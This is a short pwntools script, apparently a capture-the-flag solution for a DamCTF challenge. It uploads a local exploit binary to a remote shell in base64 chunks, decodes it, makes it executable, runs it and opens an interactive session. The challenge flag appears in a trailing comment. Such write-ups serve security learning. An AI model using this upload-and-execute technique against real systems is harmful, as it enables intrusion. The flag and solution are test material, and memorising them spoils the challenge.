# Todo: figure out a better file transer mechanism

from pwn import *

def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

# nc chals.damctf.xyz 30456
r = remote("chals.damctf.xyz", 30456)

payload = b64e(read("./exploit")).encode()
payload_chunks = chunks(payload, len(payload)//32)

orig_level = context.log_level
context.log_level = "debug"
print("BOOTING")

r.recvuntil(b"-sh")

curr_chunk = 0
for chunk in payload_chunks:
    r.sendlineafter(b"$", b'stty -echo; echo "start" >&2; while read line; do if [ "$line" = "end" ]; then break; fi; printf $line >> tmp; done; stty echo; echo "done" >&2;')
    
    print("WAITING")
    r.recvuntil(b"start\r")
    
    print(f"SENDING CHUNK {curr_chunk}")

    context.log_level = orig_level

    to_send = chunk
    while to_send:
        r.sendline(to_send[:1000])
        to_send = to_send[1000:]
        if len(to_send) // 10000 % 10 == 0:
            print(len(to_send))
    r.send(b"\nend\n")

    context.log_level = 'debug'

    print("SENDING DONE")

    print("WAITING")
    r.recvuntil(b"done");

    curr_chunk += 1

context.log_level = 'debug'

r.sendlineafter(b"$", b"base64 -d tmp > exploit; chmod +x exploit")
r.sendlineafter(b"$", b"./exploit")

r.interactive()

# dam{a_B1t_0f_4_cl1ch3d_r3f4reNc3}
